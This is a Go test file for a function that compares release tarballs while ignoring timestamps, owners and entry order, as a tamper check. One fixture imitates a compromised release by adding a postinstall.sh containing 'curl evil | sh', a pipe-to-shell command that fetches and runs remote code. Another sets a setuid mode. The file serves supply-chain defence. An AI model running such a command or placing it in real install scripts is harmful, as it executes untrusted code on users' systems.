package checksums

import (
	"archive/tar"
	"compress/gzip"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

type file struct {
	name, body string
	mode       int64
}

func tgz(t *testing.T, path string, when time.Time, owner string, files ...file) {
	t.Helper()
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	gz := gzip.NewWriter(f)
	gz.ModTime = when
	tw := tar.NewWriter(gz)
	for _, x := range files {
		if err := tw.WriteHeader(&tar.Header{Name: x.name, Mode: x.mode, Size: int64(len(x.body)), ModTime: when, Uname: owner, Gname: owner, Uid: len(owner), Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(x.body)); err != nil {
			t.Fatal(err)
		}
	}
	tw.Close()
	gz.Close()
}

func TestSameContents(t *testing.T) {
	dir := t.TempDir()
	bin := file{"terma", "the binary", 0o755}
	readme := file{"README.md", "hello", 0o644}
	published := filepath.Join(dir, "pub.tar.gz")
	tgz(t, published, time.Date(2026, 10, 14, 21, 46, 0, 0, time.UTC), "runner", bin, readme)

	rebuilt := filepath.Join(dir, "same.tar.gz")
	tgz(t, rebuilt, time.Date(2026, 10, 16, 11, 24, 0, 0, time.UTC), "jespern", readme, bin)
	if same, why, err := SameContents(published, rebuilt); err != nil || !same {
		t.Fatalf("other times, owners and order should match: %v %q %v", same, why, err)
	}

	for name, files := range map[string][]file{
		"other contents":  {{"terma", "a backdoored binary", 0o755}, readme},
		"other mode":      {{"terma", "the binary", 0o4755}, readme},
		"an extra file":   {bin, readme, {"postinstall.sh", "curl evil | sh", 0o755}},
		"a missing file":  {bin},
		"a renamed entry": {{"bin/terma", "the binary", 0o755}, readme},
	} {
		p := filepath.Join(dir, strings.ReplaceAll(name, " ", "-")+".tar.gz")
		tgz(t, p, time.Now(), "runner", files...)
		if same, why, err := SameContents(published, p); err != nil || same || why == "" {
			t.Errorf("%s: same=%v why=%q err=%v", name, same, why, err)
		}
	}
}
